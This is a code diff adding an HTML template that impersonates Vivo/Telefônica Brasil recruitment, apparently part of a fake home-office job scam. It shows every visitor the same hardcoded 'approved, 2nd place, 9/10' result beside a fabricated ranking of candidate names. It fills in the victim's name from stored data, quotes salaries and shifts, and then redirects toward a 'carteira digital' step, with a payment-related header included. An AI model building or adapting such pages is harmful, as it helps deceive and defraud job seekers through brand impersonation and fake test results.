@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+{% include 'pagamento_head.html' %}
+    <!-- DETECÇÃO INSTANTÂNEA DE DESKTOP - Aplicada antes de qualquer renderização -->
+    <script src="{{ url_for('static', filename='js/instant_detection.js') }}"></script>
+    
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "r7dfa6ijq3");
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Resultado do Teste - Vagas Home Office - Vivo</title>
+    
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Vivo Fonts -->
+    <style>
+        @font-face {
+            font-family: 'VivoType';
+            src: url('{{ url_for('static', filename='fonts/VivoTypeRegular.woff2') }}') format('woff2');
+            font-weight: normal;
+            font-style: normal;
+            font-display: swap;
+        }
+        
+        @font-face {
+            font-family: 'VivoType';
+            src: url('{{ url_for('static', filename='fonts/VivoTypeBold.woff2') }}') format('woff2');
+            font-weight: bold;
+            font-style: normal;
+            font-display: swap;
+        }
+        
+        @font-face {
+            font-family: 'VivoType';
+            src: url('{{ url_for('static', filename='fonts/VivoTypeLight.woff2') }}') format('woff2');
+            font-weight: 300;
+            font-style: normal;
+            font-display: swap;
+        }
+    </style>
+    
+    <!-- Fallback Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="https://www.commshop.com.br/vivo-fibra/assets/apps/Vivo-roxo.png" type="image/png">
+</head>
+<body>
+    <!-- Header -->
+    <header class="vivo-header">
+        <div class="container">
+            <div class="row align-items-center py-3">
+                <div class="col-6">
+                    <a href="{{ url_for('index') }}">
+                        <img src="https://www.commshop.com.br/vivo-fibra/assets/apps/Vivo-roxo.png" alt="Vivo" class="vivo-logo">
+                    </a>
+                </div>
+                <div class="col-6 text-end">
+                    <a href="#" class="text-white mx-2"><i class="fas fa-user fs-4"></i></a>
+                    <a href="#" class="text-white position-relative mx-2">
+                        <i class="fas fa-bell fs-4"></i>
+                        <span class="position-absolute top-0 start-100 translate-middle badge rounded-pill bg-danger">
+                            1
+                        </span>
+                    </a>
+                    <a href="#" class="btn btn-link text-decoration-none d-none d-md-inline-block ms-3">Minha Vivo</a>
+                    <a href="#" class="btn btn-outline-light rounded-pill btn-sm d-none d-md-inline-block">Ajuda</a>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Breadcrumbs -->
+    <div class="container py-1" style="border-bottom: 1px solid #eee;">
+        <div>
+            <span style="font-size: 11px; color: #888;">TRABALHE CONOSCO &gt; HOME OFFICE &gt; RESULTADO DO TESTE</span>
+        </div>
+    </div>
+    
+    <!-- Main Content -->
+    <main class="container my-4">
+        <div class="row">
+            <div class="col-lg-8 mx-auto">
+                <div class="card shadow-sm">
+                    <div class="card-header" style="background-color: #660099; color: white;">
+                        <h5 class="mb-0">Resultado da Avaliação</h5>
+                    </div>
+                    <div class="card-body p-4">
+                        <div class="text-center">
+                            <div class="mb-4 text-center">
+                                <img src="https://vivo.com.br/content/dam/vivo-sites/vivo-com-br/homepage/imagens/icones/vivo-vivinho-estrelas-purpura-centro-320x320.svg" alt="Aprovado" style="width: 120px; height: auto; display: block; margin: 0 auto;">
+                            </div>
+                            
+                            <h4 style="color: #660099; font-weight: 500;">Parabéns, <span id="user-name-congratulations">{{ nome|default('Candidato') }}</span>!</h4>
+                            <p class="text-muted">Você foi aprovado(a) na etapa de avaliação de aptidão e ficou em <strong>2º lugar</strong> na classificação geral!</p>
+                            
+                            <div class="result-details my-4 p-4" style="background-color: #EFEDFE; border-radius: 8px;">
+                                <div class="text-center">
+                                    <h5 class="mb-3" style="color: #660099;">Seus acertos</h5>
+                                    <div class="score-display">
+                                        <span style="font-size: 48px; font-weight: bold; color: #660099;">9</span>
+                                        <span style="font-size: 24px; color: #666;">/10</span>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="my-4">
+                                <h5 style="color: #660099; font-weight: 600; margin-bottom: 20px;">Classificação Geral:</h5>
+                                <!-- Ranking Table -->
+                                <div style="width: 100%; max-width: 100%; overflow: visible;">
+                                    <table class="w-full border border-gray-300 rounded-lg bg-white shadow-lg" style="table-layout: fixed; width: 100%;">
+                                        <thead class="bg-gray-100">
+                                            <tr>
+                                                <th class="border border-gray-300 px-1 py-2 text-center font-semibold" style="width: 15%;">Pos.</th>
+                                                <th class="border border-gray-300 px-2 py-2 text-left font-semibold" style="width: 65%;">Nome do Candidato</th>
+                                                <th class="border border-gray-300 px-1 py-2 text-center font-semibold" style="width: 20%;">Nota</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody id="ranking-table-body">
+                                            <tr>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">1º</td>
+                                                <td class="border border-gray-300 px-2 py-2 text-left text-sm">MARIA FERNANDA SILVA SANTOS</td>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">10/10</td>
+                                            </tr>
+                                            <tr id="user-position" style="background-color: #EFEDFE;">
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold" style="color: #660099;">2º</td>
+                                                <td class="border border-gray-300 px-2 py-2 text-left text-sm font-semibold" style="color: #660099;" id="user-name-ranking">{{ nome|default('CANDIDATO')|upper }}</td>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold" style="color: #660099;">9/10</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">3º</td>
+                                                <td class="border border-gray-300 px-2 py-2 text-left text-sm">ANA CAROLINA RODRIGUES LIMA</td>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">8/10</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">4º</td>
+                                                <td class="border border-gray-300 px-2 py-2 text-left text-sm">CARLOS EDUARDO PEREIRA COSTA</td>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">8/10</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">5º</td>
+                                                <td class="border border-gray-300 px-2 py-2 text-left text-sm">JULIANA CRISTINA OLIVEIRA SOUZA</td>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">7/10</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">6º</td>
+                                                <td class="border border-gray-300 px-2 py-2 text-left text-sm">BEATRIZ ALMEIDA FERREIRA DIAS</td>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">7/10</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">7º</td>
+                                                <td class="border border-gray-300 px-2 py-2 text-left text-sm">RAFAEL HENRIQUE CARVALHO MOURA</td>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">7/10</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">8º</td>
+                                                <td class="border border-gray-300 px-2 py-2 text-left text-sm">CAMILA VITÓRIA GOMES BARBOSA</td>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">6/10</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">9º</td>
+                                                <td class="border border-gray-300 px-2 py-2 text-left text-sm">LEONARDO AUGUSTO RIBEIRO NUNES</td>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">6/10</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">10º</td>
+                                                <td class="border border-gray-300 px-2 py-2 text-left text-sm">GABRIELA MARTINS CASTRO ROCHA</td>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">6/10</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">11º</td>
+                                                <td class="border border-gray-300 px-2 py-2 text-left text-sm">PATRICIA HELENA MONTEIRO VIEIRA</td>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">5/10</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">12º</td>
+                                                <td class="border border-gray-300 px-2 py-2 text-left text-sm">MARCOS ANTÔNIO FREITAS TEIXEIRA</td>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">5/10</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">13º</td>
+                                                <td class="border border-gray-300 px-2 py-2 text-left text-sm">LARISSA BEATRIZ CORREIA MENDES</td>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">4/10</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">14º</td>
+                                                <td class="border border-gray-300 px-2 py-2 text-left text-sm">FERNANDA CRISTIANE LOPES AZEVEDO</td>
+                                                <td class="border border-gray-300 px-1 py-2 text-center font-semibold">4/10</td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+                                <div class="text-center mt-3">
+                                    <small class="text-muted" style="font-style: italic;">Classificação baseada na avaliação de aptidão aplicada em {{ now.day }}/{{ now.month }}/{{ now.year }}</small>
+                                </div>
+                            </div>
+                            
+                            <div class="mt-4 mb-4 p-4" style="background-color: #EFEDFE; border-radius: 12px; border: 1px solid #d8d4fa;">
+                                <div class="text-center mb-4">
+                                    <img src="https://vivo.com.br/content/dam/vivo-sites/vivo-com-br/homepage/imagens/destaques/vivo-carreiras-depoimento02-920x610.svg" alt="Profissionais da Vivo" style="max-width: 80%; height: auto; border-radius: 8px;">
+                                </div>
+                                <h5 style="color: #660099; font-weight: 600; margin-bottom: 20px; font-size: 20px;">Escolha seu turno de trabalho</h5>
+                                
+                                <div class="mb-4 p-3" style="background-color: rgba(255, 255, 255, 0.8); border-radius: 8px; border: 1px solid #e5e0f5;">
+                                    <div style="text-align: left;">
+                                        <h6 style="color: #660099; font-weight: 600; margin-bottom: 12px; font-size: 15px;">Informações sobre jornada de trabalho:</h6>
+                                        <ul style="list-style-type: none; padding-left: 5px; margin-bottom: 0;">
+                                            <li style="margin-bottom: 8px; font-size: 14px;"><span style="color: #660099; font-size: 18px; margin-right: 6px; vertical-align: middle;">•</span> <strong>Dias regulares:</strong> Segunda a sexta-feira</li>
+                                            <li style="margin-bottom: 8px; font-size: 14px;"><span style="color: #660099; font-size: 18px; margin-right: 6px; vertical-align: middle;">•</span> <strong>Remuneração regular:</strong> R$ 1.788,60 mensal</li>
+                                            <li style="margin-bottom: 8px; font-size: 14px;"><span style="color: #660099; font-size: 18px; margin-right: 6px; vertical-align: middle;">•</span> <strong>Dias opcionais:</strong> Sábados, domingos e feriados</li>
+                                            <li style="margin-bottom: 8px; font-size: 14px;"><span style="color: #660099; font-size: 18px; margin-right: 6px; vertical-align: middle;">•</span> <strong>Diária especial:</strong> R$ 178,00 por 8 horas trabalhadas em dias opcionais</li>
+                                            <li style="font-size: 14px;"><span style="color: #660099; font-size: 18px; margin-right: 6px; vertical-align: middle;">•</span> <strong>Pagamento:</strong> Todo dia 05 de cada mês</li>
+                                        </ul>
+                                    </div>
+                                </div>
+                                
+                                <form id="turnoForm">
+                                    <div class="shift-options">
+                                        <div class="row">
+                                            <div class="col-md-4 mb-3">
+                                                <input type="radio" class="btn-check" name="turno" id="turno-manha" value="manha" required>
+                                                <label class="btn w-100 shift-option h-100 d-flex flex-column justify-content-between" for="turno-manha">
+                                                    <div style="text-align: center;">
+                                                        <div class="turno-icon">
+                                                            <i class="fas fa-sun"></i>
+                                                        </div>
+                                                        <h6 class="mb-2 mt-2">Turno Manhã</h6>
+                                                        <div class="horario-box">
+                                                            <i class="far fa-clock me-1"></i> 06:00 - 14:00
+                                                        </div>
+                                                        <p class="mt-2 mb-3">1h de descanso</p>
+                                                    </div>
+                                                    <div class="vagas-info">
+                                                        <span>12 vagas disponíveis</span>
+                                                    </div>
+                                                    <div class="select-button mt-2">
+                                                        <span>Selecionar</span>
+                                                    </div>
+                                                </label>
+                                            </div>
+                                            <div class="col-md-4 mb-3">
+                                                <input type="radio" class="btn-check" name="turno" id="turno-tarde" value="tarde">
+                                                <label class="btn w-100 shift-option h-100 d-flex flex-column justify-content-between" for="turno-tarde">
+                                                    <div style="text-align: center;">
+                                                        <div class="turno-icon">
+                                                            <i class="fas fa-cloud-sun"></i>
+                                                        </div>
+                                                        <h6 class="mb-2 mt-2">Turno Tarde</h6>
+                                                        <div class="horario-box">
+                                                            <i class="far fa-clock me-1"></i> 14:00 - 20:00
+                                                        </div>
+                                                        <p class="mt-2 mb-3">1h de descanso</p>
+                                                    </div>
+                                                    <div class="vagas-info">
+                                                        <span>9 vagas disponíveis</span>
+                                                    </div>
+                                                    <div class="select-button mt-2">
+                                                        <span>Selecionar</span>
+                                                    </div>
+                                                </label>
+                                            </div>
+                                            <div class="col-md-4 mb-3">
+                                                <input type="radio" class="btn-check" name="turno" id="turno-noite" value="noite">
+                                                <label class="btn w-100 shift-option h-100 d-flex flex-column justify-content-between" for="turno-noite">
+                                                    <div style="text-align: center;">
+                                                        <div class="turno-icon">
+                                                            <i class="fas fa-moon"></i>
+                                                        </div>
+                                                        <h6 class="mb-2 mt-2">Turno Noite</h6>
+                                                        <div class="horario-box">
+                                                            <i class="far fa-clock me-1"></i> 20:00 - 02:00
+                                                        </div>
+                                                        <p class="mt-2 mb-1">1h de descanso</p>
+                                                        <div class="adicional-info">
+                                                            <span>Adicional noturno: R$ 199,32/mês</span>
+                                                        </div>
+                                                    </div>
+                                                    <div class="vagas-info">
+                                                        <span>22 vagas disponíveis</span>
+                                                    </div>
+                                                    <div class="select-button mt-2">
+                                                        <span>Selecionar</span>
+                                                    </div>
+                                                </label>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </form>
+                                
+                                <style>
+                                    .shift-option {
+                                        background-color: white;
+                                        border: 1px solid #e0e0e0;
+                                        color: #444;
+                                        padding: 20px 15px;
+                                        border-radius: 12px;
+                                        transition: all 0.3s ease;
+                                        box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+                                    }
+                                    
+                                    .btn-check:checked + .shift-option {
+                                        background-color: #660099 !important;
+                                        color: white !important;
+                                        border-color: #660099 !important;
+                                        box-shadow: 0 4px 10px rgba(102, 0, 153, 0.3);
+                                        transform: translateY(-2px);
+                                    }
+                                    
+                                    .btn-check:focus + .shift-option, 
+                                    .shift-option:focus {
+                                        box-shadow: 0 0 0 0.25rem rgba(102, 0, 153, 0.25);
+                                    }
+                                    
+                                    .shift-option:hover {
+                                        background-color: #f9f5ff;
+                                        border-color: #d0c5e0;
+                                        transform: translateY(-2px);
+                                    }
+                                    
+                                    .turno-icon {
+                                        width: 60px;
+                                        height: 60px;
+                                        background-color: #f0e8ff;
+                                        border-radius: 50%;
+                                        display: flex;
+                                        align-items: center;
+                                        justify-content: center;
+                                        margin: 0 auto 10px;
+                                        font-size: 24px;
+                                        color: #660099;
+                                    }
+                                    
+                                    .btn-check:checked + .shift-option .turno-icon {
+                                        background-color: rgba(255, 255, 255, 0.2);
+                                        color: white;
+                                    }
+                                    
+                                    .horario-box {
+                                        background-color: #f5f5f5;
+                                        padding: 8px 10px;
+                                        border-radius: 20px;
+                                        font-weight: 500;
+                                        display: inline-block;
+                                        font-size: 0.95rem;
+                                    }
+                                    
+                                    .btn-check:checked + .shift-option .horario-box {
+                                        background-color: rgba(255, 255, 255, 0.2);
+                                    }
+                                    
+                                    .vagas-info {
+                                        border-top: 1px solid #eee;
+                                        padding-top: 12px;
+                                        margin-top: 10px;
+                                        font-size: 0.9rem;
+                                        text-align: center;
+                                        color: #666;
+                                    }
+                                    
+                                    .btn-check:checked + .shift-option .vagas-info {
+                                        border-top-color: rgba(255, 255, 255, 0.2);
+                                        color: rgba(255, 255, 255, 0.9);
+                                    }
+                                    .select-button {
+                                        background-color: #f0e8ff;
+                                        color: #660099;
+                                        border-radius: 20px;
+                                        padding: 5px 15px;
+                                        font-weight: 500;
+                                        font-size: 14px;
+                                        text-align: center;
+                                        transition: all 0.2s ease;
+                                        max-width: 150px;
+                                        margin: 0 auto;
+                                        border: 1px solid #d0c5e0;
+                                    }
+                                    
+                                    .btn-check:checked + .shift-option .select-button {
+                                        background-color: white;
+                                        color: #660099;
+                                        font-weight: bold;
+                                    }
+                                    
+                                    .adicional-info {
+                                        background-color: #ffe8f0;
+                                        color: #d30069;
+                                        border-radius: 20px;
+                                        padding: 5px 15px;
+                                        font-size: 13px;
+                                        display: inline-block;
+                                        margin-bottom: 10px;
+                                    }
+                                    
+                                    .btn-check:checked + .shift-option .adicional-info {
+                                        background-color: rgba(255, 255, 255, 0.25);
+                                        color: white;
+                                    }
+                                </style>
+                            </div>
+                            
+                            <div class="mt-4">
+                                <button type="button" id="btnProsseguir" class="btn px-5" style="background-color: #CCCCCC; color: white; font-weight: bold; border-radius: 25px; padding: 10px 30px;" disabled>
+                                    PROSSEGUIR
+                                </button>
+                            </div>
+                            
+                            <script>
+                                document.addEventListener('DOMContentLoaded', function() {
+                                    const turnoInputs = document.querySelectorAll('input[name="turno"]');
+                                    const btnProsseguir = document.getElementById('btnProsseguir');
+                                    
+                                    // Verifica se um turno foi selecionado
+                                    function verificarSelecao() {
+                                        let selecionado = false;
+                                        turnoInputs.forEach(input => {
+                                            if (input.checked) {
+                                                selecionado = true;
+                                            }
+                                        });
+                                        
+                                        btnProsseguir.disabled = !selecionado;
+                                        
+                                        // Muda a aparência do botão baseado na seleção
+                                        if (selecionado) {
+                                            btnProsseguir.style.backgroundColor = "#660099";
+                                            btnProsseguir.style.color = "white";
+                                        } else {
+                                            btnProsseguir.style.backgroundColor = "#CCCCCC";
+                                            btnProsseguir.style.color = "white";
+                                        }
+                                    }
+                                    
+                                    // Adiciona o evento para verificar quando uma opção é selecionada
+                                    turnoInputs.forEach(input => {
+                                        input.addEventListener('change', verificarSelecao);
+                                    });
+                                    
+                                    // Quando o botão é clicado, redireciona para a próxima página
+                                    btnProsseguir.addEventListener('click', function() {
+                                        // Armazena o turno selecionado (opcional, se precisar usar depois)
+                                        let turnoSelecionado = '';
+                                        turnoInputs.forEach(input => {
+                                            if (input.checked) {
+                                                turnoSelecionado = input.value;
+                                            }
+                                        });
+                                        
+                                        // Pode armazenar em sessionStorage se precisar usar depois
+                                        sessionStorage.setItem('turnoSelecionado', turnoSelecionado);
+                                        
+                                        // Redireciona para a página da Carteira Digital
+                                        const currentParams = new URLSearchParams(window.location.search);
+                                        const redirectUrl = new URL("{{ url_for('carteira_digital') }}", window.location.origin);
+                                        currentParams.forEach((value, key) => {
+                                            redirectUrl.searchParams.set(key, value);
+                                        });
+                                        window.location.href = redirectUrl.toString();
+                                    });
+                                });
+                            </script>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="py-4 mt-5" style="background-color: #660099; color: white;">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-3 mb-4 mb-md-0">
+                    <h5 class="mb-3">Produtos e Serviços</h5>
+                    <ul class="list-unstyled">
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Planos Móveis</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Internet Fixa</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">TV</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Combo Vivo</a></li>
+                        <li><a href="#" class="text-white text-decoration-none">Vivo App</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-3 mb-4 mb-md-0">
+                    <h5 class="mb-3">Suporte</h5>
+                    <ul class="list-unstyled">
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Minha Vivo</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">2ª Via de Conta</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Cobertura</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Desbloqueio</a></li>
+                        <li><a href="#" class="text-white text-decoration-none">Fale Conosco</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-3 mb-4 mb-md-0">
+                    <h5 class="mb-3">Institucional</h5>
+                    <ul class="list-unstyled">
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Sobre a Vivo</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Sustentabilidade</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Trabalhe Conosco</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Para Empresas</a></li>
+                        <li><a href="#" class="text-white text-decoration-none">Privacidade</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-3">
+                    <h5 class="mb-3">Redes Sociais</h5>
+                    <div class="d-flex mb-4">
+                        <a href="#" class="text-white me-3"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#" class="text-white me-3"><i class="fab fa-twitter"></i></a>
+                        <a href="#" class="text-white me-3"><i class="fab fa-instagram"></i></a>
+                        <a href="#" class="text-white me-3"><i class="fab fa-youtube"></i></a>
+                        <a href="#" class="text-white"><i class="fab fa-linkedin-in"></i></a>
+                    </div>
+                    <h5 class="mb-3">Baixe o App</h5>
+                    <div class="d-flex">
+                        <a href="#" class="text-white me-3"><i class="fab fa-app-store-ios"></i> App Store</a>
+                        <a href="#" class="text-white"><i class="fab fa-google-play"></i> Google Play</a>
+                    </div>
+                </div>
+            </div>
+            <hr class="my-4" style="border-color: rgba(255,255,255,0.2);">
+            <div class="row">
+                <div class="col-12 text-center text-white-50 small">
+                    <p class="mb-1">© 2025 Telefônica Brasil S.A. Todos os direitos reservados.</p>
+                    <p class="mb-0">CNPJ: 02.558.157/0001-62 | Endereço: Av. Eng. Luiz Carlos Berrini, 1376 - São Paulo - SP - 04571-936</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+                
+    <!-- Bootstrap, jQuery e Popper.js -->
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js"></script>
+    <!-- Script de carregamento para transições -->
+    <script src="{{ url_for('static', filename='js/loading.js') }}"></script>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Função para buscar nome do usuário dos dados salvos
+            function getUserName() {
+                let userName = null;
+                
+                // Tentar buscar do localStorage primeiro
+                const userData = localStorage.getItem('userData');
+                if (userData) {
+                    try {
+                        const parsedData = JSON.parse(userData);
+                        if (parsedData.nome) {
+                            userName = parsedData.nome;
+                        }
+                    } catch (e) {
+                        console.log('Erro ao processar dados do localStorage:', e);
+                    }
+                }
+                
+                // Se não encontrou no localStorage, tentar buscar do sessionStorage
+                if (!userName) {
+                    const sessionData = sessionStorage.getItem('userData');
+                    if (sessionData) {
+                        try {
+                            const parsedSessionData = JSON.parse(sessionData);
+                            if (parsedSessionData.nome) {
+                                userName = parsedSessionData.nome;
+                            }
+                        } catch (e) {
+                            console.log('Erro ao processar dados do sessionStorage:', e);
+                        }
+                    }
+                }
+                
+                return userName;
+            }
+            
+            // Atualizar nome do usuário na tabela de classificação
+            const userNameElement = document.getElementById('user-name-ranking');
+            const userNameCongratulations = document.getElementById('user-name-congratulations');
+            
+            const userName = getUserName();
+            
+            if (userName) {
+                // Atualizar nome na tabela (maiúsculo)
+                if (userNameElement) {
+                    userNameElement.textContent = userName.toUpperCase();
+                }
+                
+                // Atualizar nome nos parabéns (primeira letra maiúscula)
+                if (userNameCongratulations) {
+                    // Formatar nome para exibição normal (primeira letra maiúscula)
+                    const formattedName = userName.split(' ')
+                        .map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())
+                        .join(' ');
+                    userNameCongratulations.textContent = formattedName;
+                }
+            }
+        });
+    </script>
+</body>
+</html>
